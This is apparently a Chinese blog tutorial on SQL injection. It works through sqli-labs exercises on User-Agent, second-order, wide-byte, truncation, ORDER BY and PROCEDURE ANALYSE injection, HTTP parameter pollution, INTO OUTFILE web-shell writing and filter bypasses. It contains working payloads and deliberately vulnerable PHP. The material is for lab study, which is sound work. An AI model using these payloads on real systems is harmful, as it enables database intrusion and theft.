浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk 等等。 3、Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。 4、Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。 5、Authorization：当客户端接收到来自WEB 服务器的WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB 服务器。 6、Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB 服务器去取） max-age：（只接受Age 值小于max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值） min-fresh：（接受其新鲜生命期大于其当前Age 跟min-fresh 值之和的缓存对象） 响应：public(可以用Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟WEB 服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存） 7、Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。 响应：close（连接已经关闭）。 keepalive（连接保持着，在等待本次连接的后续请求）。 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300 8、Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip 9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。 10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012 11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022 12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml 13、ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB 服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。 14、Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT 15、Host：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn 16、If-Match：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。 17、If-None-Match：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。 18、If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT 19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 20、If-Range：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一 起使用。 21、Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 22、Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a> 23、Pramga：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache 24、Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 25、Range：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、Referer：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a> 27、Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix) 28、User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14 29、Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked 30、Vary: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding 31、Via： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><p><strong>sqli-labs/less18</strong></p><p>从代码中看到</p><pre class="language-none"><code class="language-none">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)";</code></pre><p>将useragent 和ip 插入到数据库中，那么我们是不是可以用这个来进行注入呢？</p><p>将<code>user-agent</code> 修改为<code>'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;</code></p><h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><h3 id="一阶注射"><a href="#一阶注射" class="headerlink" title="一阶注射"></a>一阶注射</h3><h3 id="二阶注射"><a href="#二阶注射" class="headerlink" title="二阶注射"></a>二阶注射</h3><p>一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间接的对WEB 产生危害，这样的就被称为是二阶注入.</p><p><strong>sqli-labs/Less-24</strong></p><p>二次排序注入思路：</p><ol><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin 的密码。Sql 语句变为UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’ ， 也就是执行了UPDATE users SET passwd=”New_Pass” WHERE username =’admin’</li></ol><p>步骤演示： （1）初始数据库为</p><p>（2）注册admin’#账号</p><p>注意此时的数据库中出现了admin’#的用户，同时admin 的密码为123</p><p>（4）登录admin’#，并修改密码</p><p>可以看到admin 的密码已经修改为1111</p><h2 id="服务器（两层）架构"><a href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><p>服务器端有两个部分：第一部分为tomcat 为引擎的jsp 型服务器，第二部分为apache为引擎的php 服务器，真正提供web 服务的是php 服务器。工作流程为：client 访问服务器，能直接访问到tomcat 服务器，然后tomcat 服务器再向apache 服务器请求数据。数据返回路径则相反。</p><p>重点：index.php?id=1&amp;id=2，你猜猜到底是显示id=1 的数据还是显示id=2 的？</p><p>Explain：apache（php）解析最后一个参数，即显示id=2 的内容。Tomcat（jsp）解析第一个参数，即显示id=1 的内容。</p><p>以上图片为大多数服务器对于参数解析的介绍。 此处我们想一个问题：index.jsp?id=1&amp;id=2 请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。 字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。 几种常见的字符集： <code>ASCII</code>编码：单字节编码 <code>latin1</code>编码：单字节编码 <code>gbk</code>编码：使用一字节和双字节编码，<code>0x00-0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。双字节的第一字节范围是<code>0x81-0xFE</code> <code>UTF-8</code>编码：使用一至四字节编码，<code>0x00–0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。其它字符用二至四个字节变长表示。</p><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。 通常来说，一个<code>gbk</code>编码汉字，占用2个字节。一个<code>utf-8</code>编码的汉字，占用3个字节。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了<code>SET NAMES 'gbk' </code>或是<code>SET character_set_client =gbk</code>，这样配置会引发编码转换从而导致的注入漏洞。</p><pre class="language-none"><code class="language-none">$conn-&gt;query("set names 'gbk';");</code></pre><h3 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1:3307"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> $    conn<span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names 'gbk';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//非常安全的转义函数</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>';"</span><span class="token punctuation">;</span>    <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rs</span><span class="token operator">-&gt;</span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span>用户名输入：admin' or 1=1#转义后为： admin\' or 1=1#执行语句：... where username='admin\' or 1=1#'用户名输入：admin%df' or 1=1#转义后为： admin%df\' or 1=1#SET character_set_client ='gbk'后：admin運' or 1=1#执行语句：... where username='admin運' or 1=1#'</code></pre><p><code>%df</code> 吃掉<code>\ </code>具体的原因是<code>urlencode(\') </code>= <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的，第一位范围为<code>0x00-0x7F</code>时，当作一个字符。<code>%df</code>不在这个范围内，因此会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><h3 id="Latin1编码"><a href="#Latin1编码" class="headerlink" title="Latin1编码"></a>Latin1编码</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"failed: %s\n"</span><span class="token punctuation">,</span> Smysqli<span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//我们在其基础上添加这么一条语句。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You can't do this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sqL</span><span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `table1` WHERE username='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>'"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select returned %d rous.\n"</span><span class="token punctuation">,</span><span class="token variable">$resule</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">fetch_</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        var_ <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>    <span class="token variable">$resule</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></code></pre><p>SQL语句会先转成<code>character_set_client</code>设置的编码。但他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</p><p>字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></p><p>UTF-8编码是变长编码，可能有1~4个字节表示：</p><p>• 一字节时范围是<code>[00-7F]</code> • 两字节时范围是<code>[C0-DF][80-BF]</code> • 三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> • 四字节时范围是<code>[F0-F7][80-BF][80-BF</code>][80-BF] 然后根据<code>RFC 3629</code>规范，又有一些字节值是不允许出现在<code>UTF-8</code>编码中的：</p><p>所以最终，UTF-8第一字节的取值范围是：<code>00-7F</code>、<code>C2-F4</code>。</p><p>输入：<code>?username=admin%c2</code> 其中<code>%c2</code>是一个<code>Latin1</code>字符集不存在的字符。<code>%00-%7F</code>可以直接表示某个字符、<code>%C2-%F4</code>不可以直接表示某个字符而只是其他长字节编码结果的首字节。</p><p>对于不完整的长字节UTF-8编码的字符，进行字符集转换时会直接忽略，所以<code>admin%c2</code>会变成<code>admin</code></p><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><pre class="language-none"><code class="language-none">CREATE TABLE users(    username varchar(20),    password varchar(20))</code></pre><p>漏洞代码逻辑如下：</p><p>代码由登录和注册构成。</p><p>1.用<code>select * from table where username='$username'</code>检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。</p><p>2.用户名不存在，用<code>insert into table values('$username','$password')</code>把你输入的用户名密码插入数据库。</p><p><code>insert</code>和<code>select</code>语句执行不一样造成</p><p><code>INSERT</code>语句：截取前20个字符 <code>SELECT</code>语句：输入什么就是什么</p><p>当我们注册时字符串长度超过20，那么使用<code>select</code>检测时就会不存在，那么就使用<code>insert</code>插入，这时候由于长度超过20，截取前20个字符。</p><p>注册<code>admin a</code> -&gt; <code>SELECT</code>认为不存在-&gt; <code>INSERT</code>了前20位-&gt; 使用自己注册的<code>admin</code>和对应密码进行登录~</p><pre class="language-none"><code class="language-none">INSERT插入了admin+15空格，实际上是插入了admin，末尾的空格会被MySQL忽略掉</code></pre><p>这样就修改了<code>admin</code>的密码了</p><h2 id="order-by-后的injection"><a href="#order-by-后的injection" class="headerlink" title="order by 后的injection"></a>order by 后的injection</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><p>从本关开始，我们开始学习order by 相关注入的知识。本关的sql 语句为$sql = “SELECT * FROM users ORDER BY $id”;尝试?sort=1 desc 或者asc，显示结果不同，则表明可以注入。（升序or 降序排列）从上述的sql 语句中我们可以看出，我们的注入点在order by 后面的参数中，而order by不同于的我们在where 后的注入点，不能使用union 等进行注入。如何进行order by 的注入，我们先来了解一下mysql 官方select 的文档。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span>     <span class="token punctuation">[</span><span class="token keyword">ALL</span> <span class="token operator">|</span> <span class="token keyword">DISTINCT</span> <span class="token operator">|</span> <span class="token keyword">DISTINCTROW</span> <span class="token punctuation">]</span>       <span class="token punctuation">[</span>HIGH_PRIORITY<span class="token punctuation">]</span>       <span class="token punctuation">[</span>STRAIGHT_JOIN<span class="token punctuation">]</span>       <span class="token punctuation">[</span>SQL_SMALL_RESULT<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_BIG_RESULT<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_BUFFER_RESULT<span class="token punctuation">]</span>       <span class="token punctuation">[</span>SQL_CACHE <span class="token operator">|</span> SQL_NO_CACHE<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_CALC_FOUND_ROWS<span class="token punctuation">]</span>     select_expr <span class="token punctuation">[</span><span class="token punctuation">,</span> select_expr <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">FROM</span> table_references     <span class="token punctuation">[</span><span class="token keyword">WHERE</span> where_condition<span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">GROUP</span> <span class="token keyword">BY</span> {col_name <span class="token operator">|</span> expr <span class="token operator">|</span> position}       <span class="token punctuation">[</span><span class="token keyword">ASC</span> <span class="token operator">|</span> <span class="token keyword">DESC</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token keyword">WITH ROLLUP</span><span class="token punctuation">]</span><span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">HAVING</span> where_condition<span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> {col_name <span class="token operator">|</span> expr <span class="token operator">|</span> position}       <span class="token punctuation">[</span><span class="token keyword">ASC</span> <span class="token operator">|</span> <span class="token keyword">DESC</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> {<span class="token punctuation">[</span><span class="token keyword">offset</span><span class="token punctuation">,</span><span class="token punctuation">]</span> row_count <span class="token operator">|</span> row_count <span class="token keyword">OFFSET</span> <span class="token keyword">offset</span>}<span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">PROCEDURE</span> procedure_name<span class="token punctuation">(</span>argument_list<span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'file_name'</span> export_options       <span class="token operator">|</span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">'file_name'</span>       <span class="token operator">|</span> <span class="token keyword">INTO</span> var_name <span class="token punctuation">[</span><span class="token punctuation">,</span> var_name<span class="token punctuation">]</span><span class="token punctuation">]</span>     <span class="token punctuation">[</span><span class="token keyword">FOR</span> <span class="token keyword">UPDATE</span> <span class="token operator">|</span> <span class="token keyword">LOCK</span> <span class="token operator">IN</span> <span class="token keyword">SHARE</span> <span class="token keyword">MODE</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>我们可利用order by 后的一些参数进行注入。</p><p>（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)</code></pre><p>没有报错，但是right 换成left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。此处可以直接构造?sort= 后面的一个参数。此时，我们可以有三种形式，</p><ul><li>直接添加注入语句，?sort=(select *<strong>*</strong>)</li><li>利用一些函数。例如rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)</code></pre><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(true</code></pre><ul><li>利用and，例如?sort=1 and (加sql 语句)。</li></ul><p>同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</code></pre><p>接下来我们用rand()进行演示一下，因为上面提到rand(true)和rand(false)结果是不一样的。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。</code></pre><p>延时注入例子</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</span></code></pre><p>同时也可以用?sort=1 and 后添加注入语句。</p><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p><p>利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),con</span>cat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span>如果不支持报错注入的话，还可以基于时间注入：<span class="token comment">//SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span></code></pre><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"将查询结果导入到文件当中那这个时候我们可以考虑上传网马，利用lines terminated byInto outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16 进制转换)</code></pre><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><pre class="language-none"><code class="language-none">/**/替代空格%09 TAB 键（水平）%0a 新建一行%0c 新的一页%0d return 功能%0b TAB 键（垂直）%a0 空格() 